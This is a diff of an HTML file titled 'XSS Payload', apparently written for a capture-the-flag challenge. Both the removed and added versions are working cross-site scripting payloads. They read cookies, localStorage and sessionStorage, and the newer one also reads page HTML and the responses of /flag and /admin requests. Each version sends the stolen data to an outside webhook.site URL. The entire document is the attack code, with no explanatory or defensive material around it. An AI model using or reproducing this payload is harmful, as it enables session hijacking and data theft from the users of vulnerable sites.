@@ -1,16 +1,28 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>XSS Payload</title>
-  </head>
-  <body>
-    <h1>Hello Spider 🕷️</h1>
-    <script>
-      new Image().src = "https://webhook.site/3065fcb8-910e-4718-9d4c-881b2c8257a9"
-        + "?cookie=" + encodeURIComponent(document.cookie)
-        + "&ls=" + encodeURIComponent(JSON.stringify(localStorage))
-        + "&ss=" + encodeURIComponent(JSON.stringify(sessionStorage));
-    </script>
-  </body>
+<body>
+<script>
+(async () => {
+  let out = "";
+  try {
+    out += "COOKIE=" + document.cookie + "\n";
+    out += "LS=" + JSON.stringify(localStorage) + "\n";
+    out += "SS=" + JSON.stringify(sessionStorage) + "\n";
+    out += "HTML=" + document.documentElement.outerHTML.substring(0,1500) + "\n";
+    // thử gọi API /flag hoặc /admin
+    try {
+      let r = await fetch("/flag");
+      out += "/flag => " + await r.text();
+    } catch(e) {}
+    try {
+      let r = await fetch("/admin");
+      out += "/admin => " + await r.text();
+    } catch(e) {}
+  } catch(e) {
+    out = "ERROR:" + e;
+  }
+  new Image().src = "https://webhook.site/3065fcb8-910e-4718-9d4c-881b2c8257a9?d=" + encodeURIComponent(out);
+})();
+</script>
+</body>
 </html>
